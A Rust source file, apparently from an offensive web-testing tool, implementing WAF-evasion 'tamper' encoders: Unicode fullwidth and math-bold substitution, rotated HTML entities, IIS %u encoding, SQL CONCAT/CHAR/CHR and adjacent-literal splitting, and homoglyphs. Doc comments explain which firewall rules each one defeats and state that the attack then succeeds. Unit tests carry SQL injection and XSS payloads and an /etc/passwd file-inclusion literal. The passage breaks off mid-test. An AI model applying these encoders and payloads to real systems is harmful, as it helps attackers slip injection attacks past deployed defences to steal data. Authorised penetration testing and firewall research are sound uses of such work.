//! Unicode and HTML entity encoding strategies.
use std::fmt::Write as _;

/// Unicode encoding — each character becomes `\uXXXX`.
///
/// **Context**: ONLY safe when the target parser performs JSON/JavaScript decoding.
/// Using this on raw HTTP parameters will send a literal backslash-u sequence.
#[must_use]
pub fn unicode_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for ch in payload.chars() {
        let code = ch as u32;
        if code > 0xFFFF {
            // Non-BMP: emit surrogate pair (valid in JSON/JavaScript)
            let surrogate_base = code - 0x1_0000;
            let high = 0xD800 + ((surrogate_base >> 10) & 0x3FF);
            let low = 0xDC00 + (surrogate_base & 0x3FF);
            let _ = write!(&mut out, "\\u{high:04X}\\u{low:04X}");
        } else {
            let _ = write!(&mut out, "\\u{code:04X}");
        }
    }
    out
}

/// IIS/ASP percent Unicode encoding — each character becomes `%uXXXX`.
///
/// **Context**: ONLY safe on IIS/ASP classic parsers. IIS `%u` encoding
/// is bounded to BMP (U+0000–U+FFFF) — non-BMP code points must be
/// emitted as UTF-16 surrogate pairs (`%uD83D%uDE00` for 😀, NOT the
/// invalid `%u1F600`). Pre-fix the loop wrote `ch as u32` straight
/// into a 4-hex-wide format, silently truncating high bytes for any
/// supplementary plane char and producing output IIS rejects — which
/// looked encoded but bypassed nothing.
#[must_use]
pub fn iis_unicode_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for ch in payload.chars() {
        let code = ch as u32;
        if code > 0xFFFF {
            let surrogate_base = code - 0x1_0000;
            let high = 0xD800 + ((surrogate_base >> 10) & 0x3FF);
            let low = 0xDC00 + (surrogate_base & 0x3FF);
            let _ = write!(&mut out, "%u{high:04X}%u{low:04X}");
        } else {
            let _ = write!(&mut out, "%u{code:04X}");
        }
    }
    out
}

/// JSON string encoding — wraps the payload in a JSON string with proper escaping.
///
/// **Context**: ONLY safe when the target parser performs JSON decoding.
#[must_use]
pub fn json_string_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 2 + 2);
    out.push('"');
    for ch in payload.chars() {
        match ch {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '\u{0008}' => out.push_str("\\b"),
            '\u{000C}' => out.push_str("\\f"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => {
                let _ = write!(&mut out, "\\u{:04X}", c as u32);
            }
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

/// HTML entity encoding — each character becomes `&#xXX;`.
///
/// **Context**: ONLY safe in HTML contexts where the browser decodes entities.
#[must_use]
pub fn html_entity_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for ch in payload.chars() {
        let _ = write!(&mut out, "&#x{:X};", ch as u32);
    }
    out
}

/// HTML decimal entity encoding — each character becomes `&#DD;`.
///
/// **Context**: ONLY safe in HTML contexts where the browser decodes entities.
#[must_use]
pub fn html_entity_decimal_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for ch in payload.chars() {
        let _ = write!(&mut out, "&#{};", ch as u32);
    }
    out
}

/// HTML entity encoding with per-character variant rotation.
///
/// Cycles each character through four browser-tolerant forms that strict
/// WAF regexes (which typically anchor on `&#x[0-9a-f]+;` with a lowercase
/// `x` and required `;`) miss:
///
/// 1. `&#xHH;`     — canonical lowercase-x hex
/// 2. `&#XHH;`     — uppercase-X hex (browsers accept; case-sensitive regex misses)
/// 3. `&#DD;`      — decimal
/// 4. `&#000DD;`   — decimal with leading zeros (HTML5 spec allows arbitrary leading zeros)
///
/// Rotation is by character index (deterministic; same input always
/// produces the same output — important for proptest idempotency).
///
/// **Bypass mechanism**: a `ModSecurity` regex like
/// `@rx &#x([0-9a-f]+);.*&#x([0-9a-f]+);` won't match a payload of
/// `&#X3C;&#0060;&#x73;&#62;` (the same `<s` payload routed through all
/// four variants). The browser decodes all four; the regex anchored on
/// the canonical form sees a different shape.
///
/// **Context**: HTML body / attribute. Equivalent to `html_entity` /
/// `html_entity_decimal` for browser decoding; safer against
/// canonicalising WAFs that strip the trailing `;` only on the lowercase
/// form.
#[must_use]
pub fn html_entity_variants(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 8);
    for (idx, ch) in payload.chars().enumerate() {
        let code = ch as u32;
        match idx % 4 {
            0 => {
                let _ = write!(&mut out, "&#x{code:x};");
            }
            1 => {
                let _ = write!(&mut out, "&#X{code:X};");
            }
            2 => {
                let _ = write!(&mut out, "&#{code};");
            }
            _ => {
                let _ = write!(&mut out, "&#000{code};");
            }
        }
    }
    out
}

/// Fullwidth Unicode encoding — replaces ASCII with fullwidth equivalents.
///
/// Maps `!`–`~` (0x21–0x7E) to the fullwidth range `！`–`～` (0xFF01–0xFF5E).
/// Spaces become ideographic space (U+3000).
///
/// **Bypass mechanism**: Many WAFs regex against ASCII keywords like `SELECT`,
/// `UNION`, `<script>`, etc. Fullwidth characters are visually identical but
/// have different codepoints, so regex fails. However, backends that perform
/// Unicode NFKC normalization will convert them back to ASCII — meaning the
/// payload executes while the WAF never saw it.
///
/// **Context**: Effective against WAFs in front of servers that normalize Unicode
/// (Java/Spring, .NET, Python 3, Go, `PostgreSQL`, etc.).
#[must_use]
pub fn fullwidth_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 3);
    for ch in payload.chars() {
        let mapped = match ch {
            ' ' => '\u{3000}', // Ideographic space
            c if ('\x21'..='\x7e').contains(&c) => {
                // Fullwidth offset: U+FF01 = U+0021 + 0xFEE0
                char::from_u32(c as u32 + 0xFEE0).unwrap_or(c)
            }
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Mathematical Alphanumeric Symbols encoding — replaces ASCII letters and
/// digits with their Math-Bold counterparts in the Unicode `U+1D400` block.
///
/// `A`–`Z` → `U+1D400`–`U+1D419` (Math Bold Capitals: 𝐀 𝐁 … 𝐙)
/// `a`–`z` → `U+1D41A`–`U+1D433` (Math Bold Smalls:   𝐚 𝐛 … 𝐳)
/// `0`–`9` → `U+1D7CE`–`U+1D7D7` (Math Bold Digits:   𝟎 𝟏 … 𝟗)
/// Everything else is passed through unchanged (punctuation, spaces, etc.,
/// keep working as SQL/HTML syntax).
///
/// **Bypass mechanism**: every codepoint in this range NFKC-normalises back
/// to its plain-ASCII counterpart. Databases / frameworks that perform NFKC
/// normalisation (`PostgreSQL` with ICU collations, `MySQL`
/// `utf8mb4_0900_ai_ci`, Java `Normalizer.normalize(s, NFKC)`, Python
/// `unicodedata.normalize('NFKC', s)`, Go `golang.org/x/text/unicode/norm`)
/// see the original `SELECT` / `UNION` / `script` keyword and execute /
/// render it. WAFs scanning bytes for ASCII keywords see codepoints in the
/// `U+1D400` block — no keyword match.
///
/// **Distinct from `fullwidth_encode`**: fullwidth uses the `U+FF00`
/// Halfwidth-and-Fullwidth-Forms block. Math Alphanumeric uses the
/// `U+1D400` block — different code range, different WAF coverage gap.
/// WAFs that block fullwidth (a common technique since 2020) often do not
/// also block Math Alphanumeric Symbols. Both encode-paths NFKC to ASCII.
///
/// **Context**: any target whose backend NFKC-normalises before parsing.
/// Confirmed targets: `PostgreSQL` ICU + `MySQL` `utf8mb4_0900_ai_ci`
/// SQL identifiers, Java/Spring Boot path matching, .NET `String.Normalize`.
#[must_use]
pub fn math_bold_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    for ch in payload.chars() {
        let mapped = match ch {
            'A'..='Z' => char::from_u32(0x1D400 + (ch as u32 - 'A' as u32)).unwrap_or(ch),
            'a'..='z' => char::from_u32(0x1D41A + (ch as u32 - 'a' as u32)).unwrap_or(ch),
            '0'..='9' => char::from_u32(0x1D7CE + (ch as u32 - '0' as u32)).unwrap_or(ch),
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// SQL string-literal CONCAT splitter — converts every single-quoted string
/// in the payload to a `CONCAT('a','b',...)` expression with one char per
/// argument.
///
/// Input  `'admin'`  → output  `CONCAT('a','d','m','i','n')`
///
/// **Bypass mechanism**: CRS rules and most commercial WAF blocklists
/// scan for literal danger-string substrings — `'admin'`, `'password'`,
/// `'union'`, `'or 1'`, `'/etc/passwd'`. CONCAT-splitting decomposes the
/// substring into one-character literals that no individual literal-string
/// regex matches. The DB evaluates `CONCAT(...)` to the original string at
/// runtime, so the attack succeeds.
///
/// Supported by MySQL, MariaDB, PostgreSQL, MSSQL (all ship CONCAT as a
/// scalar function). Oracle uses `CONCAT(a,b)` as binary-only, so chained
/// 1-char Oracle calls would need a nested form — out of scope here; the
/// `||` pipe concat in PostgreSQL/Oracle is a separate tamper.
///
/// **Edge cases**:
/// - Empty string literals (`''`) become `CONCAT('')` — valid SQL,
///   evaluates to empty string.
/// - Escaped quotes inside strings (`'O\'Brien'`) are passed through as
///   raw chars to CONCAT — the backslash and quote are split into separate
///   args.
/// - Strings not in single quotes are left alone (no aggressive parsing
///   of double-quoted SQL Server identifiers).
///
/// **Context**: SQL injection payloads with string literals.
#[must_use]
pub fn sql_concat_split(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    let mut chars = payload.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch != '\'' {
            out.push(ch);
            continue;
        }
        // Found opening quote — collect chars until closing quote.
        let mut literal = String::new();
        let mut closed = false;
        while let Some(&next) = chars.peek() {
            chars.next();
            if next == '\'' {
                closed = true;
                break;
            }
            literal.push(next);
        }
        if !closed {
            // Unbalanced quote — emit original opener + collected chars.
            out.push('\'');
            out.push_str(&literal);
            continue;
        }
        // Emit CONCAT('a','b',...).  Empty literal → CONCAT('').
        out.push_str("CONCAT(");
        if literal.is_empty() {
            out.push_str("''");
        } else {
            // Direct write loop instead of collect+join — saves N+1
            // heap String allocations per literal. Per perf-hunt F03.
            let mut first = true;
            for c in literal.chars() {
                if !first {
                    out.push(',');
                }
                first = false;
                if c == '\'' {
                    out.push_str("''''");
                } else {
                    out.push('\'');
                    out.push(c);
                    out.push('\'');
                }
            }
        }
        out.push(')');
    }
    out
}

/// SQL CHAR()-function decomposition — converts every single-quoted string
/// literal in the payload to a `CHAR(N1,N2,...)` function call with one
/// codepoint per argument.
///
/// Input  `'admin'`  → output  `CHAR(97,100,109,105,110)`
///
/// **Bypass mechanism**: distinct from `sql_concat_split` (which produces
/// `CONCAT('a','d',...)`) — CHAR() takes integer codepoints, not single-
/// char strings, so the payload contains NO single-quoted ASCII tokens at
/// all. WAF rules that match string-literal patterns (`'admin'`,
/// `'password'`, `'/etc/passwd'`, `'or 1'`) and CONCAT-shaped patterns
/// (`CONCAT\(.{,8}\)`) both miss this form. Most CRS rules through PL3 do
/// NOT pattern-match raw CHAR() — it's been the sqlmap default for over a
/// decade and has been deemed too noisy to block.
///
/// Supported by MySQL, MariaDB (native `CHAR()`), MSSQL (`CHAR()`). For
/// Postgres / Oracle, the equivalent is `CHR()` — out of scope here; a
/// sibling `chr_decompose` could ship later.
///
/// **Edge cases**:
/// - Empty literals (`''`) become `CHAR()` — valid MySQL syntax that
///   evaluates to NULL. May not be what the operator wanted; treat as a
///   neutral marker.
/// - Multi-byte UTF-8 chars produce a single `CHAR(codepoint)` per
///   `chars()` iteration — for codepoints > 255, MySQL's CHAR() returns
///   per-byte; the codepoint may not round-trip exactly. Most SQLi
///   payloads use ASCII literals — this matters only for adversarial
///   inputs.
/// - Unbalanced opening quote: emitted unchanged.
///
/// **Context**: SQL injection with string-literal targets that are
/// blocklisted (`admin`, `password`, paths, hostnames).
#[must_use]
pub fn sql_char_decompose(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 5);
    let mut chars = payload.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch != '\'' {
            out.push(ch);
            continue;
        }
        let mut literal = String::new();
        let mut closed = false;
        while let Some(&next) = chars.peek() {
            chars.next();
            if next == '\'' {
                closed = true;
                break;
            }
            literal.push(next);
        }
        if !closed {
            out.push('\'');
            out.push_str(&literal);
            continue;
        }
        out.push_str("CHAR(");
        // Direct write loop — per perf-hunt F03.
        let mut first = true;
        for c in literal.chars() {
            if !first {
                out.push(',');
            }
            first = false;
            let _ = write!(&mut out, "{}", c as u32);
        }
        out.push(')');
    }
    out
}

/// Postgres / Oracle CHR()-function decomposition — `CHR(N) || CHR(N) || ...`
/// per char of every single-quoted string literal.
///
/// Input  `'admin'`  →  output  `(CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110))`
///
/// Differs from `sql_char_decompose` (which uses MySQL's variadic
/// `CHAR(N1,N2,...)`) — Postgres / Oracle `CHR()` is unary, so codepoints
/// are concatenated via the SQL standard `||` pipe operator. The wrapping
/// parens preserve precedence inside larger expressions (`WHERE u = ...`).
///
/// Postgres-specific: codepoints up to U+10FFFF are valid; Oracle CHR(N)
/// treats N modulo `NLS_CHARACTERSET` size (often 256-modular for
/// `WE8MSWIN1252`). For ASCII payloads (the common case) both behave
/// identically.
///
/// Empty literal → `('')`. Unbalanced quote → passed through.
#[must_use]
pub fn pg_chr_decompose(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 7);
    let mut chars = payload.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch != '\'' {
            out.push(ch);
            continue;
        }
        let mut literal = String::new();
        let mut closed = false;
        while let Some(&next) = chars.peek() {
            chars.next();
            if next == '\'' {
                closed = true;
                break;
            }
            literal.push(next);
        }
        if !closed {
            out.push('\'');
            out.push_str(&literal);
            continue;
        }
        if literal.is_empty() {
            out.push_str("('')");
            continue;
        }
        // Direct write loop — per perf-hunt F03.
        out.push('(');
        let mut first = true;
        for c in literal.chars() {
            if !first {
                out.push_str("||");
            }
            first = false;
            let _ = write!(&mut out, "CHR({})", c as u32);
        }
        out.push(')');
    }
    out
}

/// Partial JSON Unicode escape — encodes ASCII alphanumeric chars as
/// `\uXXXX` while leaving structural punctuation (quotes, operators,
/// whitespace) bare.
///
/// **Bypass mechanism**: Keyword fingerprint rules (UNION, SELECT, alert,
/// script, eval, …) match against the byte sequence. Splitting the
/// keyword across Unicode escapes defeats them — the origin's JSON
/// parser / JS engine re-materializes the keyword at the application
/// layer, but the WAF sees `UNION` in the wire
/// bytes and finds no `UNION`. Distinct from [`unicode_encode`] which
/// escapes EVERY char (high `\u` density flags some heuristic WAFs);
/// this leaves the SQL/HTML/JS structural skeleton visible, so the
/// payload still looks like data.
///
/// **Idempotent**: pre-existing `\uXXXX` sequences in the input are
/// detected and passed through verbatim — second-pass tampering does
/// not re-escape an already-escaped char.
///
/// **Context**: ONLY safe when the target parser performs
/// JSON-style / JavaScript-style Unicode decoding. Inert against raw
/// HTTP parameters (you'll send literal backslash-u bytes).
#[must_use]
pub fn json_unicode_alnum(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    let chars: Vec<char> = payload.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '\\'
            && i + 5 < chars.len()
            && chars[i + 1] == 'u'
            && chars[i + 2..i + 6].iter().all(|h| h.is_ascii_hexdigit())
        {
            for k in 0..6 {
                out.push(chars[i + k]);
            }
            i += 6;
            continue;
        }
        if c.is_ascii_alphanumeric() {
            let _ = write!(&mut out, "\\u{:04X}", c as u32);
        } else {
            out.push(c);
        }
        i += 1;
    }
    out
}

/// SQL adjacent-string-literal concatenation — every `'string'` literal of
/// length ≥ 2 is rewritten as a sequence of single-character adjacent
/// literals: `'admin'` → `'a' 'd' 'm' 'i' 'n'`.
///
/// **Bypass mechanism**: SQL standard (ANSI SQL-92 §5.3) specifies that
/// two adjacent character-string literals separated only by whitespace
/// are concatenated by the parser. MySQL, Postgres, SQLite, Oracle, DB2
/// all implement this. WAF rules that match the literal substring of
/// well-known credentials or paths (e.g. `'admin'`, `'/etc/passwd'`)
/// see N unrelated single-character strings instead of one token. The
/// database rejoins them at parse time — no comments, no CONCAT calls,
/// no special functions. Pure SQL semantics.
///
/// **Idempotent**: every output sub-literal has length 1, below the
/// split threshold — a second pass leaves the output unchanged.
///
/// **Context**: Effective against any byte-pattern WAF inspecting
/// SQL bodies. Inert outside SQL context (won't fire on non-quoted
/// payloads).
#[must_use]
pub fn sql_adjacent_string_concat(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() + 8);
    let mut chars = payload.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch != '\'' {
            out.push(ch);
            continue;
        }
        let mut literal = String::new();
        let mut closed = false;
        while let Some(&next) = chars.peek() {
            chars.next();
            if next == '\'' {
                if chars.peek() == Some(&'\'') {
                    literal.push('\'');
                    chars.next();
                    continue;
                }
                closed = true;
                break;
            }
            literal.push(next);
        }
        if !closed {
            out.push('\'');
            out.push_str(&literal);
            continue;
        }
        let lit_chars: Vec<char> = literal.chars().collect();
        if lit_chars.len() < 2 {
            // Length-0 or length-1 literal: pass through. Note for
            // length-1 with `'`: that's a literal containing a single
            // `'`, which we encode as `''''` (four-quote form) to keep
            // the output SQL-valid.
            out.push('\'');
            if lit_chars.len() == 1 && lit_chars[0] == '\'' {
                out.push_str("''");
            } else {
                out.push_str(&literal);
            }
            out.push('\'');
            continue;
        }
        // Single-character split: each char of the literal becomes its
        // own `'c'` quoted token, joined by single spaces. ANSI SQL-92
        // §5.3 concatenates them at parse time. Idempotent: each output
        // sub-literal has length 1 (below the threshold) so a second
        // pass sees only short literals and produces identical output.
        //
        // Escaped-quote handling: if the source literal contained a
        // SQL `''` escape it lives in `literal` as a single `'` char.
        // The shattered single-char literal for that position emits
        // `''''` (four-quote form: opening quote, escaped quote, escaped
        // quote, closing quote) so the database reassembles the
        // original `'` content. Idempotency holds because `''''` parses
        // as a length-1 literal containing `'` on the next pass.
        let mut first = true;
        for c in lit_chars {
            if !first {
                out.push(' ');
            }
            first = false;
            out.push('\'');
            if c == '\'' {
                out.push_str("''");
            } else {
                out.push(c);
            }
            out.push('\'');
        }
    }
    out
}

/// Homoglyph substitution — replaces select ASCII characters with visually
/// identical Unicode characters from other scripts.
///
/// **Bypass mechanism**: WAFs match `'`, `"`, `<`, `>`, `=`, etc. as literal
/// bytes. Unicode homoglyphs look identical in logs but aren't matched by
/// byte-level regex. If the backend performs Unicode normalization (NFKC) or
/// accepts these codepoints in SQL/HTML contexts, the payload executes.
///
/// **Context**: Effective against byte-level WAFs. Requires backend Unicode
/// tolerance (common in modern frameworks).
#[must_use]
pub fn homoglyph_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    for ch in payload.chars() {
        let mapped = match ch {
            // Quotes and delimiters
            '\'' => '\u{2019}', // RIGHT SINGLE QUOTATION MARK (')
            '"' => '\u{201D}',  // RIGHT DOUBLE QUOTATION MARK (")
            // Comparison operators
            '<' => '\u{FF1C}', // FULLWIDTH LESS-THAN SIGN (＜)
            '>' => '\u{FF1E}', // FULLWIDTH GREATER-THAN SIGN (＞)
            '=' => '\u{FF1D}', // FULLWIDTH EQUALS SIGN (＝)
            // Punctuation
            '(' => '\u{FF08}', // FULLWIDTH LEFT PARENTHESIS (（)
            ')' => '\u{FF09}', // FULLWIDTH RIGHT PARENTHESIS (）)
            ';' => '\u{FF1B}', // FULLWIDTH SEMICOLON (；)
            '-' => '\u{2010}', // HYPHEN (‐)
            '/' => '\u{2215}', // DIVISION SLASH (∕)
            // Keep letters and digits unchanged for readability
            c => c,
        };
        out.push(mapped);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn unicode_encode_basic() {
        assert_eq!(unicode_encode("A"), "\\u0041");
        assert_eq!(unicode_encode("AB"), "\\u0041\\u0042");
    }

    #[test]
    fn json_unicode_alnum_keyword_split() {
        // "UNION" becomes 5 `\uXXXX` sequences, ASCII bytes nowhere.
        let out = json_unicode_alnum("UNION");
        assert_eq!(out, "\\u0055\\u004E\\u0049\\u004F\\u004E");
        assert!(!out.contains("UNION"));
    }

    #[test]
    fn json_unicode_alnum_leaves_punctuation() {
        // SQLi shape: keywords escaped, structural delimiters bare.
        let out = json_unicode_alnum("' OR 1=1--");
        assert_eq!(out, "' \\u004F\\u0052 \\u0031=\\u0031--");
        let out2 = json_unicode_alnum("AB CD");
        assert_eq!(out2, "\\u0041\\u0042 \\u0043\\u0044");
    }

    #[test]
    fn json_unicode_alnum_idempotent_skip_pass() {
        // Second pass MUST be a no-op — already-escaped \uXXXX
        // sequences are detected and passed through.
        let once = json_unicode_alnum("UNION SELECT");
        let twice = json_unicode_alnum(&once);
        assert_eq!(once, twice, "tamper must stabilize");
    }

    #[test]
    fn json_unicode_alnum_preserves_quote_unencoded() {
        // ' is U+0027 — NOT alphanumeric, so must stay literal.
        let out = json_unicode_alnum("'");
        assert_eq!(out, "'");
    }

    #[test]
    fn json_unicode_alnum_xss_keyword_split() {
        // <script>alert — `<`, `>`, `(`, `)` stay bare; letters/digits escape.
        let out = json_unicode_alnum("<script>alert(1)</script>");
        assert!(!out.contains("script"));
        assert!(!out.contains("alert"));
        assert!(out.contains('<'));
        assert!(out.contains('>'));
        assert!(out.contains('('));
    }

    #[test]
    fn json_unicode_alnum_empty_input() {
        assert_eq!(json_unicode_alnum(""), "");
    }

    #[test]
    fn sql_adjacent_string_concat_basic() {
        // 'admin' (len 5) → 5 single-char adjacent literals.
        assert_eq!(sql_adjacent_string_concat("'admin'"), "'a' 'd' 'm' 'i' 'n'");
    }

    #[test]
    fn sql_adjacent_string_concat_short_literal_unchanged() {
        // Length-1 literals must pass through (already minimum).
        assert_eq!(sql_adjacent_string_concat("'a'"), "'a'");
        assert_eq!(sql_adjacent_string_concat("''"), "''");
    }

    #[test]
    fn sql_adjacent_string_concat_idempotent() {
        // Well-formed (balanced quotes) payload — the literals 'admin'
        // and 'root' each shatter into single-char adjacent literals.
        let once = sql_adjacent_string_concat("WHERE x='admin' OR y='root'");
        let twice = sql_adjacent_string_concat(&once);
        assert_eq!(once, twice, "tamper must stabilize on second pass");
        assert!(once.contains("'a' 'd' 'm' 'i' 'n'"));
        assert!(once.contains("'r' 'o' 'o' 't'"));
    }

    #[test]
    fn sql_adjacent_string_concat_preserves_outside_literal() {
        // No quoted literal in payload — must be a no-op.
        assert_eq!(sql_adjacent_string_concat("1 OR 1=1--"), "1 OR 1=1--");
    }

    #[test]
    fn sql_adjacent_string_concat_handles_escaped_quote() {
        // SQL '' escape inside a literal: the position holding `'` is
        // emitted as the four-quote form `''''` — opening, escaped pair,
        // closing — which parses as a length-1 literal containing `'`.
        // The database reassembles "O" + "'" + "B" + "r" + "i" + "e" + "n".
        let out = sql_adjacent_string_concat("'O''Brien'");
        assert_eq!(out, "'O' '''' 'B' 'r' 'i' 'e' 'n'");
    }

    #[test]
    fn sql_adjacent_string_concat_escaped_quote_idempotent() {
        // Second pass: the `''''` token is a length-1 literal containing
        // `'` (below split threshold). It must pass through unchanged
        // (via the length-1 branch with the escaped-quote sub-case).
        let once = sql_adjacent_string_concat("'O''Brien'");
        let twice = sql_adjacent_string_concat(&once);
        assert_eq!(once, twice);
    }

    #[test]
    fn sql_adjacent_string_concat_single_quote_literal_emits_four_quotes() {
        // A literal of length 1 containing only `'` (source: `''''`)
        // must output the same `''''` (passthrough form).
        let out = sql_adjacent_string_concat("''''");
        assert_eq!(out, "''''");
    }

    #[test]
    fn sql_adjacent_string_concat_its_a_test_shatters_correctly() {
        // The dogfood agent's B5 reproducer.
        let out = sql_adjacent_string_concat("'it''s a test'");
        // Literal content: "it's a test" (11 chars). Each char emits
        // its own single-char literal; the `'` becomes `''''`.
        assert_eq!(out, "'i' 't' '''' 's' ' ' 'a' ' ' 't' 'e' 's' 't'");
    }

    #[test]
    fn sql_adjacent_string_concat_unterminated_quote_passthrough() {
        // Defensive: an unclosed quote must not crash and must not
        // wrap-then-mistakenly-close. Output should preserve the bytes
        // verbatim except for the unmatched-quote tail.
        let out = sql_adjacent_string_concat("'unclosed");
        assert_eq!(out, "'unclosed");
    }

    #[test]
    fn sql_adjacent_string_concat_path_literal_split() {
        // /etc/passwd path literal is a high-fidelity LFI fingerprint.
        // 11 chars → 11 single-char literals; the byte sequence
        // `/etc/passwd` no longer appears contiguously.
        let out = sql_adjacent_string_concat("'/etc/passwd'");
        assert_eq!(out, "'/' 'e' 't' 'c' '/' 'p' 'a' 's' 's' 'w' 'd'");
        assert!(!out.contains("/etc/passwd"));
    }

    #[test]
    fn json_unicode_alnum_unicode_input_passes_through() {
        // Non-ASCII chars (日本語) are NOT ascii_alphanumeric — left bare.
        // This keeps the function focused on the keyword-bypass mission.
        let out = json_unicode_alnum("日本");
        assert_eq!(out, "日本");
    }

    #[test]
    fn unicode_encode_special_chars() {
        let encoded = unicode_encode("' OR 1=1--");
        assert!(encoded.contains("\\u0027")); // '
        assert!(encoded.contains("\\u003D")); // =
    }

    #[test]
    fn unicode_encode_unicode() {
        let encoded = unicode_encode("日本語");
        assert_eq!(encoded, "\\u65E5\\u672C\\u8A9E");
    }

    #[test]
    fn iis_unicode_encode_basic() {
        assert_eq!(iis_unicode_encode("A"), "%u0041");
        assert_eq!(iis_unicode_encode("AB"), "%u0041%u0042");
    }

    #[test]
    fn iis_unicode_encode_bmp_only_for_3byte_utf8() {
        // U+65E5 (日) is BMP — emits as a single %uXXXX, no
        // surrogate. This is the existing happy path.
        assert_eq!(iis_unicode_encode("日"), "%u65E5");
    }

    #[test]
    fn iis_unicode_encode_non_bmp_emits_surrogate_pair() {
        // U+1F600 (😀) is supplementary plane. Pre-fix this emitted
        // `%u1F600` (5 hex digits — invalid IIS %u, silently
        // unencodable, bypass-rate killer). Post-fix it MUST emit a
        // UTF-16 surrogate pair `%uD83D%uDE00`.
        assert_eq!(iis_unicode_encode("😀"), "%uD83D%uDE00");
    }

    #[test]
    fn iis_unicode_encode_mixed_bmp_and_non_bmp() {
        // Adversarial: a mix of plain ASCII + BMP + supplementary
        // must produce exactly one %uXXXX or %uXXXX%uXXXX per char.
        // No 5-digit %u sequences anywhere — pin the regression.
        let out = iis_unicode_encode("A日😀");
        assert_eq!(out, "%u0041%u65E5%uD83D%uDE00");
        // Anti-regression: scan for any 5-hex-digit %u sequence.
        // The fix would silently regress if someone widened the
        // format string to %u{:05X} thinking it "supports" non-BMP.
        for hex_run in out.split("%u").skip(1) {
            let hex_part: String =
                hex_run.chars().take_while(|c| c.is_ascii_hexdigit()).collect();
            assert!(
                hex_part.len() == 4,
                "every %u sequence must be exactly 4 hex digits (IIS spec); \
                 got {hex_part:?} in output {out:?}"
            );
        }
    }

    #[test]
    fn json_encode_basic() {
        assert_eq!(json_string_encode("A"), "\"A\"");
        assert_eq!(json_string_encode("A\\B"), "\"A\\\\B\"");
        assert_eq!(json_string_encode("A\"B"), "\"A\\\"B\"");
        assert_eq!(json_string_encode("A\nB"), "\"A\\nB\"");
    }

    #[test]
    fn json_encode_control_chars() {
        assert_eq!(json_string_encode("\x01"), "\"\\u0001\"");
    }

    #[test]
    fn html_entity_encode_basic() {
        assert_eq!(html_entity_encode("A"), "&#x41;");
        assert_eq!(html_entity_encode("AB"), "&#x41;&#x42;");
    }

    #[test]
    fn html_entity_encode_special_chars() {
        let encoded = html_entity_encode("<script>");
        assert_eq!(encoded, "&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;");
    }

    #[test]
    fn html_entity_decimal_encode_basic() {
        assert_eq!(html_entity_decimal_encode("A"), "&#65;");
        assert_eq!(html_entity_decimal_encode("<"), "&#60;");
    }

    #[test]
    fn html_entity_encode_empty() {
        assert_eq!(html_entity_encode(""), "");
    }

    // ── html_entity_variants tests ─────────────────────────────────────

    #[test]
    fn html_entity_variants_cycles_four_forms() {
        // 'A'=0x41=65 — verify each of the four rotation slots
        let encoded = html_entity_variants("AAAA");
        assert_eq!(encoded, "&#x41;&#X41;&#65;&#00065;");
    }

    #[test]
    fn html_entity_variants_continues_rotation() {
        // 'A'=65 — fifth char returns to slot 0 (lowercase-x hex)
        let encoded = html_entity_variants("AAAAA");
        assert_eq!(encoded, "&#x41;&#X41;&#65;&#00065;&#x41;");
    }

    #[test]
    fn html_entity_variants_empty() {
        assert_eq!(html_entity_variants(""), "");
    }

    #[test]
    fn html_entity_variants_xss_payload() {
        // '<' = 0x3C = 60, 's'=0x73=115, '>'=0x3E=62
        // First three chars use slots 0, 1, 2:
        let encoded = html_entity_variants("<s>");
        assert_eq!(encoded, "&#x3c;&#X73;&#62;");
    }

    #[test]
    fn html_entity_variants_unicode_codepoint() {
        // emoji U+1F600 ('😀') — codepoint 128512 — exercises higher-bit chars
        let encoded = html_entity_variants("\u{1F600}");
        assert_eq!(encoded, "&#x1f600;");
    }

    #[test]
    fn html_entity_variants_distinct_from_canonical() {
        // 4+ char payload MUST differ from canonical html_entity_encode
        // (canonical is always lowercase-x hex with semicolon)
        let canon = html_entity_encode("ABCD");
        let var = html_entity_variants("ABCD");
        assert_ne!(canon, var);
    }

    #[test]
    fn html_entity_variants_deterministic() {
        // Same input → same output (no randomness; rotation is by index)
        assert_eq!(
            html_entity_variants("hello world"),
            html_entity_variants("hello world")
        );
    }

    // ── math_bold_encode tests ─────────────────────────────────────────

    #[test]
    fn math_bold_encode_uppercase() {
        assert_eq!(math_bold_encode("A"), "\u{1D400}"); // 𝐀
        assert_eq!(math_bold_encode("Z"), "\u{1D419}"); // 𝐙
    }

    #[test]
    fn math_bold_encode_lowercase() {
        assert_eq!(math_bold_encode("a"), "\u{1D41A}"); // 𝐚
        assert_eq!(math_bold_encode("z"), "\u{1D433}"); // 𝐳
    }

    #[test]
    fn math_bold_encode_digits() {
        assert_eq!(math_bold_encode("0"), "\u{1D7CE}"); // 𝟎
        assert_eq!(math_bold_encode("9"), "\u{1D7D7}"); // 𝟗
    }

    #[test]
    fn math_bold_encode_sql_keyword() {
